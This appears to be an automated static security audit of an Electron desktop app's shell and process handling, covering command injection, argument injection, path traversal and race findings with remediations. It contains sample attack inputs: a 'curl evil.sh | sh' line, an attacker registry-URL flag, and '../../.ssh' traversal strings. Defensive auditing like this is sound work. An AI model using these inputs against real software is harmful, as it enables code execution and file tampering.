# Shell & Process Audit — hermes-desktop

| Field | Value |
|---|---|
| Date (UTC) | 2026-05-02 |
| Project | hermes-desktop |
| Commit | 72d7bcc |
| Auditor | shell-and-process-auditor |
| Scope | Electron main process — all `child_process` invocations and filesystem operations under `src/main/` |
| Method | Read-only static analysis of TypeScript source. No code executed; no project files modified. |

## Severity Matrix

| Severity | Count | Findings |
|---|---|---|
| Critical | 1 | SP-001 |
| High     | 4 | SP-002, SP-003, SP-004, SP-005 |
| Medium   | 7 | SP-006, SP-007, SP-008, SP-009, SP-010, SP-011, SP-012 |
| Low      | 3 | SP-013, SP-014, SP-015 |
| Info     | 4 | SP-016, SP-017, SP-018, SP-019 |

---

## Findings

### SP-001 — Critical — Command Injection via `execSync` String Concatenation in `runHermesDoctor`

- **Category**: OS Command Injection (CWE-78)
- **Location**: `src/main/installer.ts:229`
- **Excerpt** (`installer.ts:228-239`):
  ```ts
  const output = execSync(`"${HERMES_PYTHON}" "${HERMES_SCRIPT}" doctor`, {
    cwd: HERMES_REPO,
    env: { ...process.env, PATH: getEnhancedPath(), HOME: homedir(), HERMES_HOME },
    stdio: ["ignore", "pipe", "pipe"],
    timeout: 30000,
  });
  ```
- **Description**: `execSync` is invoked with a single shell-evaluated string built by interpolating `HERMES_PYTHON` and `HERMES_SCRIPT`. Both constants are derived from `HERMES_HOME`:
  - `installer.ts:11`: `process.env.HERMES_HOME?.trim() || join(homedir(), ".hermes")`
  - `installer.ts:14-15`: `HERMES_PYTHON = join(HERMES_VENV, "bin", "python")`, `HERMES_SCRIPT = join(HERMES_REPO, "hermes")`.

  `HERMES_HOME` is environment-controlled. A user who launches Hermes Desktop with `HERMES_HOME` set to a value containing a literal double-quote breaks out of the surrounding `"` quotes and injects arbitrary shell. The double-quote wrapping in the template literal is purely cosmetic — `execSync` always invokes `/bin/sh -c <string>` underneath (see Node.js docs). The inner unescaped quote terminates the quoted token, and the rest of the line is parsed by the shell.

  Even a benign space inside `HERMES_HOME` (e.g. `/Users/Some User/.hermes`) is enough to break this call, since this is the only point in the codebase that puts variable-derived paths inside a shell-string instead of an argv array.
- **Impact**: Full main-process RCE on first launch when `HERMES_HOME` is attacker-controlled (e.g. user runs the app from a wrapper whose plist sets `HERMES_HOME`, or from a malicious launchd/profile env). Even without an attacker, paths with double-quotes or backticks corrupt the command.
- **Remediation**: Replace with `execFileSync(HERMES_PYTHON, [HERMES_SCRIPT, "doctor"], …)` exactly like the sibling `verifyInstall` (line 152), `getHermesVersion` (line 194), `runHermesBackup` (line 558), `runHermesImport` (line 605), `runHermesDump` (line 642), and `searchSkills` (line 138 in skills.ts) already do. There is no reason this single call uses the shell form.
- **References**: CWE-78 OS Command Injection; Node.js `child_process.execSync` semantics.

---

### SP-002 — High — `spawn("bash", ["-c", installCmd])` Sources Shell Profile Path Into Shell String

- **Category**: OS Command Injection (CWE-78), Untrusted Search Path
- **Location**: `src/main/installer.ts:486-492`
- **Excerpt** (`installer.ts:485-502`):
  ```ts
  const shellProfile = getShellProfile(home);
  const installCmd = [
    shellProfile ? `source "${shellProfile}" 2>/dev/null;` : "",
    "curl -fsSL https://raw.githubusercontent.com/NousResearch/hermes-agent/main/scripts/install.sh | bash -s -- --skip-setup",
  ].join(" ");

  const proc = spawn("bash", ["-c", installCmd], { ... });
  ```
- **Description**: `installCmd` is a shell string passed to `bash -c`. Two concerns:
  1. `shellProfile` is interpolated into a `source "${shellProfile}"` snippet. The path comes from `getShellProfile()` (`installer.ts:380-392`), which returns the first existing path among `~/.zshrc`, `~/.bashrc`, `~/.bash_profile`, `~/.profile`. The home directory comes from `homedir()`, which on macOS resolves via `$HOME`. If `$HOME` is attacker-controlled (or simply contains a `"` character), the surrounding double-quotes are broken and arbitrary shell runs *before* the curl-pipe-bash even fires.
  2. The `curl ... | bash` pattern fetches a remote installer over the network and executes it with the user's privileges. The trust boundary is HTTPS + GitHub. There is no pinned commit, no signature, no checksum. If `raw.githubusercontent.com` is ever compromised, the attacker gets full code execution. This is a documented anti-pattern but commonly accepted; flagged here because the same call also handles user-controlled `HERMES_HOME`/`shellProfile`.
- **Impact**: Same RCE class as SP-001, plus the inherent supply-chain exposure of `curl | bash`. The bridge to `askpass` (sudo password dialog) means a successful injection can also acquire root via the GUI prompt.
- **Remediation**:
  - Drop the `source "${shellProfile}"` indirection. The PATH the install script needs is already constructed by `getEnhancedPath()`. If profile sourcing is truly required, fork a child shell with `bash --login -c 'echo "$PATH"'` to capture `PATH`, but never embed the profile path in another shell string.
  - Validate the resolved profile path with `path.resolve` + base-dir check (must live under `homedir()`).
  - Pin the install script to a specific commit SHA and verify a SHA256 manifest before piping into `bash`.
- **References**: CWE-78; CWE-426 Untrusted Search Path; Node.js `child_process.spawn` semantics.

---

### SP-003 — High — Profile Name and Skill Identifier Reach `execFileSync` Without Validation

- **Category**: Argument Injection (CWE-88)
- **Location**:
  - `src/main/profiles.ts:187` (`createProfile`)
  - `src/main/profiles.ts:213` (`deleteProfile`)
  - `src/main/profiles.ts:238` (`setActiveProfile`)
  - `src/main/skills.ts:138` (`searchSkills`, `query` IPC arg)
  - `src/main/skills.ts:246` (`installSkill`, `identifier` IPC arg)
  - `src/main/skills.ts:275` (`uninstallSkill`, `name` IPC arg)
  - `src/main/installer.ts:601` (`runHermesImport`, `archivePath` IPC arg)
  - `src/main/cronjobs.ts:117-135` (`createCronJob` schedule/prompt/name/deliver)
  - `src/main/cronjobs.ts:142-170` (cron remove/pause/resume/trigger jobId)
- **Excerpt** (`profiles.ts:179-204`):
  ```ts
  export function createProfile(name: string, clone: boolean): { success: boolean; error?: string } {
    try {
      const args = clone
        ? ["profile", "create", name, "--clone"]
        : ["profile", "create", name];
      execFileSync(HERMES_PYTHON, [HERMES_SCRIPT, ...args], { ... });
  ```
  (`skills.ts:236-256`):
  ```ts
  export function installSkill(identifier: string, profile?: string): { success: boolean; error?: string } {
    try {
      const args = [HERMES_SCRIPT, "skills", "install", identifier, "--yes"];
      if (profile && profile !== "default") {
        args.splice(1, 0, "-p", profile);
      }
      execFileSync(HERMES_PYTHON, args, { ... });
  ```
- **Description**: All of these functions are reachable via the IPC handlers in `index.ts` (`create-profile`, `delete-profile`, `set-active-profile`, `install-skill`, `uninstall-skill`, `run-hermes-import`, `create-cron-job`, etc.) and forward the arguments verbatim into the Hermes CLI argv array. Because they go through `execFileSync` (no shell), classic shell-metacharacter injection is impossible — that is the project's main saving grace. However, every value is treated as a positional argument by the Hermes Python CLI:
  - A profile name like `--help` or `-p` will be parsed as a flag, not a name.
  - A skill identifier like `--registry-url=http://attacker/` could (depending on the Python CLI's argument parser) re-route the install URL.
  - `archivePath` is fed directly to `hermes import`; any path is accepted, including paths inside `~/.hermes` itself or with traversal sequences. There is no allow-list.
  - `cron create <schedule>` (`cronjobs.ts:125`) interprets the *schedule* string. The follow-up `prompt` is preceded by `--` (good!), but `name`, `deliver`, and `schedule` itself are not separated. If a user sends `name = "--prompt=..."` via IPC, the argparser may consume it as a flag and override the prompt.
- **Impact**: The renderer is supposed to be the trust boundary in Electron, but here a compromised renderer can drive privileged CLI behaviour by crafting cleverly-named profiles, skill IDs, archive paths, or cron names. Combined with any flag the Python CLI accepts that performs file or network IO (e.g. `--from-url`, `--config`, `--registry`), this is a path to RCE or arbitrary file read/write under the user's account.
- **Remediation**:
  - Add an `argv-safe` guard on each user-controlled argument before invoking the CLI. Reject any value that begins with `-` or contains `=` followed by another flag-like token. For profile names: enforce `^[A-Za-z0-9._-]{1,64}$`.
  - Insert `--` before every list of free-form args (already done in `cronjobs.ts:129` for `prompt` — extend to other free-form fields).
  - For `runHermesImport`, normalise `archivePath` with `path.resolve` and require it to live under `homedir()` or an explicit "allowed import" directory; reject if it points inside `HERMES_REPO` or `HERMES_HOME` so an attacker cannot replace `hermes` with a tarball.
- **References**: CWE-88 Argument Injection; OWASP "Argument Injection or Modification."

---

### SP-004 — High — Detached Child Processes (Dev Server, Adapter, Hermes Gateway) Survive Main Process Crash

- **Category**: Resource Lifecycle / Privilege Escalation Surface (CWE-404)
- **Location**:
  - `src/main/claw3d.ts:451-462` (`startDevServer` — `detached: true`)
  - `src/main/claw3d.ts:526-536` (`startAdapter` — `detached: true`)
  - `src/main/hermes.ts:677-684` (`startGateway` — `detached: true`)
- **Excerpt** (`hermes.ts:677-685`):
  ```ts
  gatewayProcess = spawn(HERMES_PYTHON, [HERMES_SCRIPT, "gateway"], {
    cwd: HERMES_REPO,
    env: gatewayEnv,
    stdio: "ignore",
    detached: true,
  });
  gatewayProcess.unref();
  ```
- **Description**: All three long-running children are spawned with `detached: true` and `unref()`, so they outlive the parent. The intent is to keep the gateway and dev server running across desktop relaunches, but the side effects are:
  1. **Stale processes hold ports.** If the main process is force-quit, `stopGateway` / `stopAdapter` / `stopDevServer` never run; the next launch finds the port busy. `claw3d.ts` partially compensates by reading the PID file, but `hermes.ts` only reads the PID file inside `stopGateway` (lines 704-744). `isGatewayRunning` (`hermes.ts:749-759`) signals the orphan with `kill(pid, 0)` only — i.e. if the OS recycled the PID for an unrelated process, the desktop app considers the gateway already running and never starts a fresh one.
  2. **`app.before-quit` only fires on graceful quit** (`index.ts:870-878`). Crashes, force-quits, and `kill -9` of the Electron parent leave the children running with the parent's full environment (including the API keys injected at `hermes.ts:670-675`). Anyone who later attaches to the child via `/proc/<pid>/environ` (Linux) or `ps eww` reads the keys.
- **Impact**: Process leakage and credential exposure to other UIDs that share the machine; persistent open ports and PID-file races.
- **Remediation**:
  - Drop `detached: true` for the dev server / adapter — they are meant to die with the desktop app.
  - On startup, scan PID files **and** verify the executable path of the running PID (`/proc/<pid>/comm` on Linux, `ps -p <pid> -o comm=` on macOS) before trusting them.
  - Register `process.on("exit"/"SIGINT"/"SIGTERM"/"uncaughtException")` handlers in `index.ts` that stop all children, not just `before-quit`.
- **References**: CWE-404 Improper Resource Shutdown or Release; Node.js `child_process` `detached` semantics.

---

### SP-005 — High — Renderer-Sourced `skillPath` Reaches `path.join` Without Containment Check

- **Category**: Path Traversal (CWE-22)
- **Location**:
  - `src/main/skills.ts:122-131` (`getSkillContent`)
  - `src/main/index.ts:507-509` (IPC handler `get-skill-content`)
- **Excerpt** (`skills.ts:122-131`):
  ```ts
  export function getSkillContent(skillPath: string): string {
    const skillFile = join(skillPath, "SKILL.md");
    if (!existsSync(skillFile)) return "";
    try {
      return readFileSync(skillFile, "utf-8");
    } catch {
      return "";
    }
  }
  ```
- **Description**: `skillPath` flows from the renderer through the IPC channel `get-skill-content`. It is then joined directly with `"SKILL.md"`. The renderer can pass any absolute path: `skillPath = "/etc"` reads `/etc/SKILL.md` (absent, returns empty), `skillPath = "/Users/<user>/.ssh"` reads `~/.ssh/SKILL.md`, and `skillPath = "/Users/<user>/.hermes"` reads `~/.hermes/SKILL.md`. While the suffix `SKILL.md` limits practical exfiltration to files literally named `SKILL.md`, a malicious renderer (compromised via XSS or an HTML-injection chain — note the askpass dialog uses `nodeIntegration:true, contextIsolation:false` and the main window has `sandbox:false`) can place a hostile SKILL.md anywhere readable and trigger a leak.
- **Impact**: Read-only disclosure of any file named `SKILL.md` on disk. With path-traversal sequences (`../`) the attacker can also probe whether arbitrary directories exist via `existsSync`.
- **Remediation**:
  - Resolve the incoming path with `path.resolve` and verify it sits under `profileHome(profile)`, `HERMES_REPO`, or `HERMES_HOME`. Reject paths that escape this allow-list.
  - Better: change the IPC contract to accept only `(profile, category, skillName)` and reconstruct the path on the main side, removing the raw-path channel entirely.
- **References**: CWE-22 Path Traversal.

---

### SP-006 — Medium — `getEnhancedPath()` Prepends Many Home-Owned Directories Before System PATH

- **Category**: Untrusted Search Path (CWE-426)
- **Location**: `src/main/installer.ts:34-51`
- **Excerpt** (`installer.ts:34-51`):
  ```ts
  const extra = [
    join(home, ".local", "bin"),
    join(home, ".cargo", "bin"),
    join(HERMES_VENV, "bin"),
    join(home, ".volta", "bin"),
    join(home, ".asdf", "shims"),
    join(home, ".local", "share", "fnm", "aliases", "default", "bin"),
    join(home, ".fnm", "aliases", "default", "bin"),
    ...resolveNvmBin(home),
    "/usr/local/bin",
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
  ];
  return [...extra, process.env.PATH || ""].join(":");
  ```
- **Description**: Every child spawned by the main module (`runInstall`, `runClawMigrate`, `runHermesUpdate`, `verifyInstall`, `getHermesVersion`, `runHermesDoctor`, profile/skill commands, gateway, dev server, adapter) inherits this PATH. The user's home-owned bin directories come *before* `/usr/local/bin` and *before* the inherited system PATH. If any of those directories contains a binary with the same basename as one the install script invokes (`git`, `python3`, `uv`, `bash`, `curl`), that user-owned binary wins.
- **Impact**: A malicious installer for an unrelated tool that drops `~/.local/bin/git` could intercept every git operation Hermes performs (clone, pull). The askpass shim is intentionally ahead of system sudo, but git/curl operations have already been executed via the shadowed binary.
- **Remediation**:
  - Use absolute paths to `git`, `bash`, `curl`, `python3` resolved once via `which` against a known-safe PATH (`/usr/bin:/bin:/usr/local/bin:/opt/homebrew/bin`), then invoke them by absolute path.
  - Move the home-owned bin directories *after* the system directories so a hijacked tool only wins when the system one is missing.
- **References**: CWE-426 Untrusted Search Path.

---

### SP-007 — Medium — `runInstall` and `runHermesUpdate` Have No `timeout`

- **Category**: Resource Exhaustion (CWE-400)
- **Location**:
  - `src/main/installer.ts:492-502` (`runInstall`)
  - `src/main/installer.ts:344-355` (`runHermesUpdate`)
  - `src/main/installer.ts:288-298` (`runClawMigrate`)
- **Excerpt** (`installer.ts:492-502`):
  ```ts
  const proc = spawn("bash", ["-c", installCmd], {
    cwd: home,
    env: { ... },
    stdio: ["ignore", "pipe", "pipe"],
  });
  ```
- **Description**: Other CLI calls in this file all set `timeout` (15 s, 30 s, 120 s). The three above do not — by design, since installs/updates can be long. The risk is that if the install script hangs (network stall, stuck `sudo` prompt the askpass dialog never receives), the spawn never resolves and the only escape hatch is to quit the desktop app, which leaves the bash child orphaned (it isn't `detached`, but the user's force-quit reparents it to PID 1 on macOS/Linux until it exits on its own).
- **Impact**: User-visible hang; potential resource leak combined with a wedged sudo prompt. No data confidentiality impact.
- **Remediation**: Add a generous wall-clock timeout (e.g. 30 minutes) and surface a "still running, kill?" UI. On timeout, send `SIGTERM` to the process group, then `SIGKILL`.
- **References**: CWE-400; Node.js `child_process.spawn` options.

---

### SP-008 — Medium — `findNpm()` Falls Through to `execSync("which npm 2>/dev/null || where npm 2>/dev/null")`

- **Category**: OS Command Injection (CWE-78) — Defence in Depth
- **Location**: `src/main/claw3d.ts:274-289`
- **Excerpt** (`claw3d.ts:274-289`):
  ```ts
  try {
    const npmPath = execSync("which npm 2>/dev/null || where npm 2>/dev/null", {
      env: { ...process.env, PATH: getEnhancedPath() },
      timeout: 5000,
    })
      .toString()
      .trim()
      .split("\n")[0];
    if (npmPath && existsSync(npmPath)) {
      _cachedNpmPath = npmPath;
      return npmPath;
    }
  } catch { /* fall through */ }
  ```
- **Description**: The command literal contains no variables, so this is not directly injectable. It is flagged because:
  1. The PATH used to resolve `npm` includes user-owned directories (see SP-006). A planted `~/.local/bin/which` would be invoked here.
  2. The result is then trusted as an absolute path and passed to `spawn(npm, …)` later (`claw3d.ts:387, 451, 526`). If a planted `which` outputs `; curl evil.sh | sh #` followed by a newline, the `[0]`th line still yields a string starting with `;` — `existsSync` returns false, so the call is rejected and falls back to the literal `"npm"` (defensive). The risk is therefore limited but not zero, since the cached `_cachedNpmPath` gates many subsequent spawns.
- **Impact**: With user-owned PATH precedence, a hostile `which` could feed back any path the attacker wants the desktop app to spawn as `npm`. The `existsSync` check narrows this to existing files, but those can be planted under `~/.local/bin` too.
- **Remediation**:
  - Use `execFileSync("/usr/bin/which", ["npm"], { env: { PATH: SAFE_SYSTEM_PATH } })`. Drop `where` (Windows is not supported by the current install path anyway).
  - Verify the returned path resolves under a known-safe set of directories before caching it.
- **References**: CWE-78; CWE-426.

---

### SP-009 — Medium — Renderer-Supplied `profile` Reaches `path.join` Without Validation in `profileHome`

- **Category**: Path Traversal / Information Disclosure (CWE-22)
- **Location**:
  - `src/main/utils.ts:22-26` (`profileHome`)
  - `src/main/installer.ts:683-765` (`discoverMemoryProviders(profile)`)
  - `src/main/installer.ts:770-784` (`getActiveMemoryProvider(profile)`)
  - `src/main/installer.ts:790-851` (`listMcpServers(profile)`)
  - `src/main/skills.ts:68-117` (`listInstalledSkills(profile)`)
  - `src/main/profiles.ts:48-72` (`countSkills(profilePath)`)
  - `src/main/cronjobs.ts:25-27` (`jobsFilePath`)
  - `src/main/memory.ts:34-40` (`memoryPath`/`userPath`)
  - `src/main/soul.ts:13, 24` (`readSoul`/`writeSoul`)
  - `src/main/tools.ts:171, 198` (`getToolsets`/`setToolsetEnabled`)
  - `src/main/config.ts:78-89` (`profilePaths`)
- **Excerpt** (`utils.ts:22-26`):
  ```ts
  export function profileHome(profile?: string): string {
    return profile && profile !== "default"
      ? join(HERMES_HOME, "profiles", profile)
      : HERMES_HOME;
  }
  ```
- **Description**: `profile` is a renderer-supplied string used only for the `profile !== "default"` comparison and then joined into `~/.hermes/profiles/<profile>`. Without normalisation, `profile = "../"` resolves to `~/.hermes/profiles/../` i.e. `~/.hermes/`, which is harmless here. But `profile = "../../"` reaches `~/`, and `profile = "../../.ssh"` resolves to `~/.ssh` — `readdirSync` will list its contents through the IPC return. Worse, `writeSoul(content, profile = "../../.ssh/authorized_keys")` will *write* to `~/.ssh/authorized_keys/SOUL.md` (creating the directory if necessary via `safeWriteFile` → `mkdirSync({recursive: true})`).
- **Impact**: Renderer can read or write arbitrary directories under the user's home that contain readable files. Combined with `getSkillContent` (SP-005) the attacker can read any `SKILL.md` whose directory path was discovered. With `writeSoul`/`writeUserProfile`/`addMemoryEntry`, the attacker can drop or overwrite files in the user's home.
- **Remediation**: In `profileHome`, validate the profile name against `^[A-Za-z0-9._-]{1,64}$`. Reject anything else; throw, log, and return `HERMES_HOME`. Apply the same guard inside every IPC handler that accepts a `profile` argument.
- **References**: CWE-22.

---

### SP-010 — Medium — `readLogs` Allow-List Doesn't Cover the `lines` Parameter

- **Category**: Improper Input Validation (CWE-20)
- **Location**: `src/main/installer.ts:857-879`
- **Excerpt** (`installer.ts:857-879`):
  ```ts
  export function readLogs(logFile = "agent.log", lines = 200): { content: string; path: string } {
    const logsDir = join(HERMES_HOME, "logs");
    const allowed = ["agent.log", "errors.log", "gateway.log"];
    const file = allowed.includes(logFile) ? logFile : "agent.log";
    const fullPath = join(logsDir, file);
    ...
    const allLines = content.split("\n");
    const tail = allLines.slice(-lines).join("\n");
    return { content: tail, path: fullPath };
  ```
- **Description**: This function is the *good example* for `logFile` — names are checked against an allow-list before joining. However the `lines` parameter is also IPC-controlled (`index.ts:668-670`); a renderer passing `lines = -1` returns the entire log via `Array.slice(1)` semantics, and `lines = Number.MAX_SAFE_INTEGER` results in unbounded memory allocation when the log is huge.
- **Impact**: Memory amplification / log harvesting.
- **Remediation**: Clamp `lines` to `[0, 5000]` and `Math.floor()` it. Verify that the resolved `fullPath` actually starts with `logsDir` to defend against any future regression of the allow-list.
- **References**: CWE-20.

---

### SP-011 — Medium — `process.kill(-pid, "SIGKILL")` Race After 3 s Timeout

- **Category**: Process Lifecycle Race (CWE-672)
- **Location**:
  - `src/main/claw3d.ts:421-440` (`killProcessTree`)
  - `src/main/claw3d.ts:498-517` (`stopDevServer`)
  - `src/main/claw3d.ts:570-589` (`stopAdapter`)
  - `src/main/hermes.ts:719-747` (`stopGateway`)
- **Excerpt** (`claw3d.ts:421-440`):
  ```ts
  function killProcessTree(proc: ChildProcess): void {
    if (proc.pid) {
      try {
        process.kill(-proc.pid, "SIGTERM");
      } catch {
        try { proc.kill("SIGTERM"); } catch { /* already dead */ }
      }
      setTimeout(() => {
        try {
          if (proc.pid) process.kill(-proc.pid, "SIGKILL");
        } catch { /* already dead */ }
      }, 3000);
    }
  }
  ```
- **Description**: The dev server / adapter / gateway processes are launched with `detached: true`, which makes them process-group leaders. `process.kill(-pid, ...)` then signals everything in that pgrp — correct per design — but only if `proc.pid` is still owned by the original child. If the OS recycles the PID and the `setTimeout` fires 3 s later with `SIGKILL`, the unrelated process gets killed by signal to `-pid`. On macOS/Linux a PID-recycle in 3 seconds is unusual but possible on a heavily loaded system.

  Additionally, `stopGateway` (`hermes.ts:719-747`) only uses `process.kill(pid, "SIGTERM")` without the `-` sign — so if the gateway forked any children of its own, those are orphaned, not killed. This is inconsistent with `claw3d.ts`.
- **Impact**: Possible signal-misdirection (rare). More commonly, gateway child processes leak.
- **Remediation**:
  - Track the pgid (via `proc.pid` immediately after spawn).
  - Before signalling at SIGKILL stage, re-verify with `kill(pid, 0)` and check `/proc/<pid>/status` (Linux) or `ps -o ppid= -p <pid>` (macOS) that the parent matches our recorded value.
  - Use `process.kill(-pid, ...)` consistently in `stopGateway` too.
- **References**: CWE-672 Use of Resource After Time-of-Check.

---

### SP-012 — Medium — `appendFileSync` / `safeWriteFile` Mutate `config.yaml` Without Locking

- **Category**: Race Condition / TOCTOU (CWE-362)
- **Location**:
  - `src/main/hermes.ts:95-115` (`ensureApiServerConfig`)
  - `src/main/config.ts:124-155` (`setEnvValue`)
  - `src/main/config.ts:170-189` (`setConfigValue`)
  - `src/main/config.ts:220-267` (`setModelConfig`)
  - `src/main/config.ts:297-354` (`setPlatformEnabled`)
  - `src/main/config.ts:388-399` (`setCredentialPool`)
  - `src/main/tools.ts:193-293` (`setToolsetEnabled`)
- **Excerpt** (`hermes.ts:95-115`):
  ```ts
  function ensureApiServerConfig(): void {
    try {
      const configPath = join(HERMES_HOME, "config.yaml");
      if (!existsSync(configPath)) return;
      const content = readFileSync(configPath, "utf-8");
      if (/api_server/i.test(content)) return;
      const addition = `...platforms: api_server: enabled: true...`;
      appendFileSync(configPath, addition, "utf-8");
    } catch { /* non-fatal */ }
  }
  ```
- **Description**: The check-then-write between `readFileSync` and `appendFileSync`/`safeWriteFile` is not atomic. If the Hermes CLI (which also writes `config.yaml` on profile use, MCP add, model change, etc.) fires concurrently — e.g. when `restartGateway` runs in `index.ts:250` — the file content can be torn or the `api_server` block can be appended twice. The same TOCTOU pattern recurs across `config.ts` and `tools.ts`: every setter reads the file, computes a new content string, and writes — racing both itself across IPC calls and the Hermes CLI on disk.
- **Impact**: Lost updates to config; duplicate entries; in the worst case, a corrupted YAML that breaks gateway startup.
- **Remediation**: Use a `proper-lockfile` (or a simple `.lock` companion file) when mutating `config.yaml` / `*.env` / `auth.json`. Read-modify-write in a single critical section. Coordinate with the Python CLI on the lock-file convention.
- **References**: CWE-362 Concurrent Execution using Shared Resource with Improper Synchronization (TOCTOU).

---

### SP-013 — Low — `runInstall` Sets `cwd: home` Instead of an Isolated Temp Directory

- **Category**: Hardening
- **Location**: `src/main/installer.ts:493`
- **Excerpt**: `cwd: home,`.
- **Description**: All other spawns set `cwd: HERMES_REPO`. `runInstall` sets `cwd: home`, which is appropriate for the very first install (the repo doesn't exist yet) but is a known risk vector for the curl-pipe-bash pattern: the install script downloads into `$HOME/.hermes` but works *from* `$HOME`, picking up any `.envrc`, `Makefile`, `Justfile`, or `package.json` that happens to be there.
- **Impact**: Low — only affects users who keep trojaned dotfiles in `$HOME`. Realistic only as part of a multi-step exploit.
- **Remediation**: Use `os.tmpdir()` as cwd for the install to isolate the script from the user's home contents.
- **References**: CWE-426; secure-install best practices.

---

### SP-014 — Low — `runCronCommand` Has No `env` Whitelist

- **Category**: Information Exposure (CWE-200)
- **Location**: `src/main/cronjobs.ts:97-115`
- **Excerpt** (`cronjobs.ts:97-115`):
  ```ts
  execFile(
    HERMES_PYTHON,
    cliArgs,
    { cwd: join(HERMES_HOME, "hermes-agent"), timeout: 15000 },
    (err, stdout, stderr) => { ... }
  );
  ```
- **Description**: `execFile` is invoked without an `env` option, so the child inherits the **entire** parent environment, including every API key the desktop app holds in memory (it injects them in `hermes.ts:670-675`). The cron CLI in turn has access to all of them, where it only needs `HERMES_HOME`, `HOME`, and `PATH`.
- **Impact**: API-key leakage to a child process that doesn't need them. Low impact because the child is also written by the Hermes project, but defence-in-depth would scope the env.
- **Remediation**: Pass an explicit `env: { PATH: getEnhancedPath(), HOME: homedir(), HERMES_HOME }` like every other call in this codebase does.
- **References**: CWE-200.

---

### SP-015 — Low — `runHermesBackup` Returns Untrusted Path String to Renderer

- **Category**: Improper Output Neutralization (CWE-117)
- **Location**: `src/main/installer.ts:582-588`
- **Excerpt** (`installer.ts:582-588`):
  ```ts
  const pathMatch = output.match(
    /(?:Backup saved|Written|Created).*?(\S+\.(?:tar\.gz|zip|tgz))/i,
  );
  resolve({
    success: true,
    path: pathMatch?.[1] || output.trim().split("\n").pop()?.trim(),
  });
  ```
- **Description**: The path string echoed back to the renderer is parsed out of `stdout` of an external process. A malicious output (from a compromised `hermes` binary, or from a bug in the Python CLI that mis-renders ANSI) could return any string; the renderer then displays it or even uses it as a click target. Not exploitable in isolation; flagged because the contract relies on `hermes` being trustworthy.
- **Impact**: Minimal; UI spoofing.
- **Remediation**: Have the Python CLI emit a JSON object with a typed `path` field instead of regex-scraping stdout.
- **References**: CWE-117.

---

### SP-016 — Info — `execFileSync`/`execFile` Used Consistently Outside the Audited Critical Spot

- **Category**: Positive Observation
- **Location**: `src/main/profiles.ts`, `src/main/skills.ts`, `src/main/cronjobs.ts`, the success-path branches of `src/main/installer.ts`.
- **Description**: With the single exception of `runHermesDoctor` (SP-001) and the curl-pipe-bash in `runInstall`, every other path uses `execFile` / `execFileSync` / `spawn` with an explicit argv array. `shell: true` is not used anywhere in `src/main/`. The project has clearly internalised the "no shell" rule, which dramatically narrows the attack surface.

---

### SP-017 — Info — Askpass Password Is Never Embedded in argv, Logs, or env

- **Category**: Positive Observation
- **Location**: `src/main/askpass.ts`
- **Description**: The password reaches the privileged child only through stdout of the helper script (which sudo reads via the `SUDO_ASKPASS` mechanism — itself fed via the unix socket at `sockPath`). It is never:
  - placed in argv,
  - exported as an environment variable,
  - written to a file other than the in-memory python heredoc,
  - logged (the `proc.stdout`/`proc.stderr` listeners process the install script's output, not the askpass helper's),
  - copied into a stack trace (no exception path captures `pw`).

  The unix socket is `chmod 0o600` on creation (`askpass.ts:94`), the temp dir is `mkdtempSync` (random suffix), and `cleanup()` removes the directory. The `BrowserWindow` for the password prompt has `contextIsolation: false, nodeIntegration: true` (line 137), but the HTML is built from a base64 data URL that the main process generates, which is acceptable in this *isolated, single-purpose* window since no user/remote content is loaded into it. Recommend adding a `Content-Security-Policy: default-src 'none'; script-src 'unsafe-inline'` header to the dialog HTML in case future edits load remote assets.
- **References**: CWE-200, CWE-532.

---

### SP-018 — Info — Renderer Cannot Mutate Main-Process `HERMES_HOME` Directly

- **Category**: Mitigating Context for SP-001
- **Location**: `src/main/installer.ts:11`
- **Description**: `HERMES_HOME` is only read once at module-load time, from `process.env.HERMES_HOME` *of the main process*. The renderer cannot mutate the main process env via Electron IPC. So the SP-001 attack requires the user (or a launchd/plist/`.command` wrapper) to set `HERMES_HOME` *before* Hermes Desktop is launched. Still exploitable by a packaged `.zip` with a wrapper, just not by a remote chat reply.
- **Impact**: Pre-conditions narrow the attacker model to "local code that can set environment variables of the desktop app at launch" — which is everyone who can drop a `.command` file or modify a `.app/Contents/Info.plist`.

---

### SP-019 — Info — Better-sqlite3 Read-Only Mode and Parameter Binding in `sessions.ts` / `memory.ts`

- **Category**: Mitigating Context
- **Location**: `src/main/sessions.ts:38`, `src/main/memory.ts:87`, `src/main/session-cache.ts:75-78`
- **Description**: `new Database(DB_PATH, { readonly: true })` is used everywhere the desktop opens the SQLite store. Renderer-supplied query strings (`searchSessions`, `getSessionMessages`) are bound as parameters, not concatenated. The FTS5 query in `searchSessions` (`sessions.ts:101-107`) sanitises the input with quote stripping and `*` prefix expansion. Worth confirming with the SQL-injection auditor, but no shell/process surface there.

---

## Methodology

### Files reviewed in full
- `src/main/installer.ts` (880 lines)
- `src/main/profiles.ts` (253 lines)
- `src/main/claw3d.ts` (634 lines)
- `src/main/skills.ts` (293 lines)
- `src/main/askpass.ts` (208 lines)
- `src/main/hermes.ts` (798 lines)
- `src/main/index.ts` (879 lines, IPC entry points)
- `src/main/cronjobs.ts` (172 lines)
- `src/main/config.ts` (400 lines)
- `src/main/utils.ts` (45 lines)
- `src/main/memory.ts` (207 lines)
- `src/main/soul.ts` (38 lines)
- `src/main/tools.ts` (294 lines)
- `src/main/sessions.ts` (182 lines)
- `src/main/session-cache.ts` (185 lines)
- `src/main/models.ts` (98 lines)

### Grep patterns used (regex form)
- `execSync\(`, `execFileSync`, `\bexec\(`, `spawn\(`, `fork\(`, `spawnSync` — all child-process call sites enumerated.
- `shell:\s*true` — none found (good).
- `child_process` import lines.
- `fs\.[a-zA-Z]+Sync`, `readFileSync`, `writeFileSync`, `unlinkSync`, `rmSync`, `cpSync`, `renameSync`, `mkdtempSync`, `mkdirSync`, `chmodSync` — every fs.*Sync site.
- `path\.join`, `os\.tmpdir`, `homedir\(\)` — every path-construction site.
- `ipcMain.handle` — verified each renderer entry point.

### Out of scope (and why)
- **Renderer code under `src/renderer/`** — handled by the renderer / IPC boundary auditor.
- **Preload script under `src/preload/`** — handled by the IPC boundary auditor.
- **Python sub-projects (`HERMES_REPO/hermes-agent/...`)** — distinct codebase, not in this repo.
- **`hermes-office` (Claw3D) cloned into `~/.hermes/hermes-office`** — third-party, runtime-cloned; out of static-analysis scope for this repo.
- **`tests/`** — test fixtures don't ship in production; not a runtime attack surface.
- **Build / electron-builder config** — covered by the dependency auditor.
- **Auto-updater** — `electron-updater` handled by the dependency auditor.

### Specific things checked that produced no finding
- No `shell: true` anywhere in `src/main/`.
- No use of `eval`, `new Function`, or `vm.runInNewContext` in main.
